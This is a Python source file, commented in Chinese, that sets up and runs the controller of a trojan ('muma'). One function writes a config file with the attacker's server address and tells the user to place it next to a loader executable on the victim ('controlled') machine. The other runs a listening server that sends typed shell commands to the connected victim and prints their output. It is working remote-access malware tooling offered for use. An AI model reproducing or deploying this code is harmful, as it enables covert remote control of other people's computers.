def mumaag():
    import socket
    def get_local_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
        finally:
            s.close()
        return ip
    print("本机ip地址为：", get_local_ip())
    server_ip = input("输入服务器ip地址:")
    server_port = input("输入服务器端口：")
    with open("cfg", "w") as f:
        f.write(server_ip + "\n" + server_port)
    print("cfg文件生成成功！\n运行服务端后将cfg文件(请生成，在根目录下)与exe加载器(根目录下muma.exe)或py加载器运行(mod中)放入被控机同一目录下运行")



def mumaser():
    import socket

    local_ip = socket.gethostbyname(socket.gethostname())
    print("本机IP地址:", local_ip)

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', int(input("输入木马连接的端口号："))))
    server_socket.listen(5)
    print("等待连接...")
    while True:
        client_socket, client_address = server_socket.accept()
        print("连接地址: %s" % str(client_address))
        print("===输入cmdexit退出===")
        while True:
            send_data = input("GOGOGO>>>")
            if send_data == "exit":
                print("=====EXIT!!!=====")
                client_socket.close()
                break
            else:
                client_socket.send(send_data.encode('utf-8'))
                recv_data = client_socket.recv(2048)
                print(recv_data.decode('utf-8'))
        break